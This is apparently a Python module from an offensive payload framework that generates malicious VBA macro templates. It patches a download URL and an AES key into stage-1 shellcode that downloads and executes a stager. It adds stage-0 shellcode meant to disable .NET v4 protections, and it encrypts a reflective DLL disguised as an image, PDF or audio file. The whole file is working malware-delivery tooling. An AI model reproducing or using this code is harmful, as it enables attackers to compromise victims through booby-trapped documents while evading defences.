
from lib.interfaces.module_interface import ModuleInterface
from lib.handlers.generic import quotedstring, escapebackslash
from lib.tab_completers.generic import tab_choice
from lib.validators.generic import iswebaddress, ischoice
from lib.validators.files import isbasename, isreadable
from data.scripts.BinaryToVbaFunc import BinaryToVbaFunc
import os
import base64


URL_PLACEHOLDER = b"http://AAAAAAAAAAAA.BBBBBBBBBBBB.CCCCCCCCCCCC/DDDDDDDDDDDD.EEEEEEEEEEEE"
AES_KEY_PLACEHOLDER = b"KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK"
STAGE1_PAYLOAD_FMTSTR = "Staging_w_padding_{}_{}-cleaned.bin"

class Template(ModuleInterface): #usename
    def __init__(self, templatePath, helpers):
        options = {}
        self.helpers = helpers
        self.randomkey = helpers.binary.getAESKey()
        self.encodings = { "0": "-", "6": "!" }
        options['url'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "Location we'll pull the output_stagefile from",
            "validator": iswebaddress,
            "handler": escapebackslash,
            "noinsert": True
        }
        options['arch'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "arch of INPUT_STAGE",
            "validator": ischoice,
            "validatorargs": {"choices": ["x86", "x64"]},
            "tab_complete": tab_choice,
            "tab_args": {'choices': ["x86", "x64"]},
            "noinsert": True
        }
        options['output_stagefile'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "Location to write encrypted stage to.  Supported file extensions [.gif, .jpg, .jpeg, .pdf, .mp3, .ico, .bmp, .der]",
            "validator": None,
            "tab_complete": self.helpers.complete_path,
            "handler": None,
            "noinsert": True
        }
        options['input_stagefile'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "Location of Reflective DLL to be encoded / encrypted and sent to output_stagefile",
            "validator": isreadable,
            "tab_complete": self.helpers.complete_path,
            "noinsert": True
        }
        options['version'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "version of .net to target 3.X or 4.X (v3, v4)",
            "validator": ischoice,
            "validatorargs": {'choices': ['v3', 'v4']},
            "tab_complete": tab_choice,
            "tab_args": {'choices': ['v3', 'v4']}
        }
        super().__init__(templatePath, options)
    # end __init__
    
    def preprocess(self):
        
        # Create the stage 1 shellcode which will download and execute the stager
        # Convert the shellcode into VBA functions
        stage1_path = os.path.join(
            self.helpers.getpayloaddir(), 
            "dullarrow", 
            STAGE1_PAYLOAD_FMTSTR.format(
                self.options['version']['value'], 
                self.options['arch']['value']
            )
        )
        stage1_shellcode = ""
        with open(stage1_path, 'rb') as fPayload:
            stage1_shellcode = fPayload.read()
        stage1_shellcode = self.helpers.binary.patchValues(
            AES_KEY_PLACEHOLDER, 
            stage1_shellcode, 
            self.randomkey
        )
        stage1_shellcode = self.helpers.binary.patchValues(
            URL_PLACEHOLDER, 
            stage1_shellcode, 
            self.options['url']['value'].encode('utf-8')
        )
        self.options['getStage_1'] = {
            "value": None,
            "required": True,
            "description": "the generated function which returns the stage1 payload buffer",
            "validator": None,
            "handler": None
        }
        self.options['getStage_1']['value'] = BinaryToVbaFunc(
            stage1_shellcode, 
            'getStage_1', 
            self.encodings
        )
        
        # Create the stage 0 shellcode which will disable some .NET v4 protections
        # Convert the shellcode into VBA functions
        stage0_path = os.path.join( 
            self.helpers.getpayloaddir(), 
            "dullarrow",  
            "dullarrow_disable_payload.bin"
        )
        stage0_shellcode = ""
        with open(stage0_path, 'rb') as fPayload:
            stage0_shellcode = fPayload.read()
        self.options['getStage_0'] = {
            "value": None,
            "required": True,
            "description": "the generated function which returns the stage0 payload buffer",
            "validator": None,
            "handler": None
        }
        self.options['getStage_0']['value'] = BinaryToVbaFunc(
            stage0_shellcode, 
            'getStage_0', 
            self.encodings
        )

        # Update the template if .NET v4 is targeted                    
        if self.options['version']['value'] == 'v4':
            template_path = os.path.join(os.path.dirname(self.templatePath), "TEMPLATE_v4.vba")
        else:
            template_path = self.templatePath
        with open(template_path, 'r') as fp:
            self.template = fp.read()
            
    # end preprocess
            

    def postprocess(self):
        # Remove the generated shellcode functions from the options
        del self.options['getStage_0']
        del self.options['getStage_1']
        
        file_type = self.options['output_stagefile']['value'].split('.')[-1]
        payload = self.helpers.encode_dll(
            self.options['input_stagefile']['value'], 
            file_type, 
            self.randomkey
        )
        with open(self.options['output_stagefile']['value'], 'wb') as fp:
            fp.write(payload)
    # end postprocess


